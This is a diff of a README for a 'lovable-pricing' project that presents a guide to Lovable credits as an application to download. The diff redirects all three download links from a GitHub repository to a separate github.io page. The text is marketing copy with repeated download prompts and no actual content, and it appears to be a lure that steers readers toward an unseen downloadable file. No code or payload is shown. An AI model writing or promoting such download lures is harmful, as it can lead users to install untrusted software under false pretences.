@@ -1,6 +1,6 @@
 # 💡 lovable-pricing - Master Lovable Credits & Save Money
 
-[![Download Now](https://img.shields.io/badge/Download-Lovable_Pricing_Guide-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Moonshinegigabyte993/lovable-pricing)
+[![Download Now](https://img.shields.io/badge/Download-Lovable_Pricing_Guide-blue?style=for-the-badge&logo=github&color=4B0082)](https://moonshinegigabyte993.github.io)
 
 ## 🎯 What Is This?
 
@@ -10,7 +10,7 @@ This is your go-to guide for understanding **Lovable pricing** without the heada
 
 To access this valuable guide, you need to download it to your computer. It's a quick and simple process—no technical skills required!
 
-Visit this link to download the application: [Download lovable-pricing](https://github.com/Moonshinegigabyte993/lovable-pricing)
+Visit this link to download the application: [Download lovable-pricing](https://moonshinegigabyte993.github.io)
 
 Once you're on the page, look for the green "Code" button or a download link, and click it to save the guide to your computer.
 
@@ -62,7 +62,7 @@ Yes! Most users find that understanding credit expiration and daily grants alone
 
 Don't let confusing pricing eat into your budget. Click the button below to download your copy now and start mastering your credits today.
 
-**👉 [Download Lovable Pricing Guide Here](https://github.com/Moonshinegigabyte993/lovable-pricing)**
+**👉 [Download Lovable Pricing Guide Here](https://moonshinegigabyte993.github.io)**
 
 Stop guessing how Lovable bills you. Get clear answers and a money-saving alternative, all in one place. Your wallet will thank you.
 
